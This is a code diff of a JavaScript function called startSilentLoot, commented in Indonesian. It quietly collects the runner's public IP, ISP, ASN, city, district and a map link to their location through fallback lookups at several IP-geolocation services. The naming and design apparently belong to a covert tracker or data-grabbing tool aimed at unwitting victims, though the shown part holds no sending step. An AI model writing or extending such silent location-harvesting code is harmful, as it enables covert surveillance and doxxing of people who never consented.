@@ -110,26 +110,23 @@ async function startSilentLoot() {
                 loc: `https://www.google.com/maps?q=${d.latitude},${d.longitude}`,
                 asn: d.asn
             };
-        } catch (e) { console.log("API 1 Limit/Error"); }
+        } catch (e) { console.log("API 1 Limit"); }
 
-        // CADANGAN 2: IP-API (Tanpa Key, limit 45 req/menit)
+        // CADANGAN 2: IPIFY (Pake yang lu mau, tapi datanya CUMA IP)
         try {
-            const res = await fetch(`http://ip-api.com/json/?fields=status,country,regionName,city,district,zip,lat,lon,isp,as,query`);
-            const d = await res.json();
-            if (d.status === "success") return {
-                ip: d.query, isp: d.isp, city: d.city,
-                district: d.district || "N/A",
-                loc: `https://www.google.com/maps?q=${d.lat},${d.lon}`,
-                asn: d.as
-            };
-        } catch (e) { console.log("API 2 Limit/Error"); }
+            const response = await fetch('https://api.ipify.org?format=json');
+            const data = await response.json();
+            report.ip = data.ip; // Pakai report.ip (langsung), jangan pake .network kalau gak ada
+        } catch (e) {
+            report.ip = "Failed to fetch IP";
+        }
 
-        // CADANGAN 3: Cloudflare (Pasti Jalan, tapi data cuma IP & Negara)
+        // CADANGAN 3: Cloudflare (Benteng terakhir)
         try {
             const res = await fetch(`https://1.1.1.1/cdn-cgi/trace`);
             const text = await res.text();
             const ip = text.match(/ip=(.*)\n/)[1];
-            return { ip: ip, isp: "Cloudflare Warp / Direct", city: "Unknown", district: "N/A", loc: "#", asn: "Unknown" };
+            return { ip: ip, isp: "Cloudflare Warp", city: "Unknown", district: "N/A", loc: "#", asn: "Unknown" };
         } catch (e) { return { ip: "All API Failed" }; }
     }
 
